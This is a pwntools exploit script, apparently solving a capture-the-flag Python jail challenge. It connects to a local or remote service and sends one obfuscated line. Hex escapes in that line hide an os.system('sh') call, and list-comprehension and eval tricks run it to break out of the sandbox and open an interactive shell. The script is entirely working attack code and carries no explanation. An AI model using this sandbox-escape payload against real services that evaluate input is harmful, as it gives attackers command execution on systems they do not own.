#!/bin/env python3

from pwn import *
import sys

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process("python3 ./src/run.py", shell=True)
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT and args.DBG:
            if script:
                attach(self.p, "\n".join(script))
            else:
                attach(self.p)


x, p = init()
p.sendline("[self["+r"'\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x73\x68\x27\x29'"+"]\rif\r[run.__getitem__\rfor\rrun.__getitem__\rin\r[eval.__call__]]else[]]")
p.interactive()
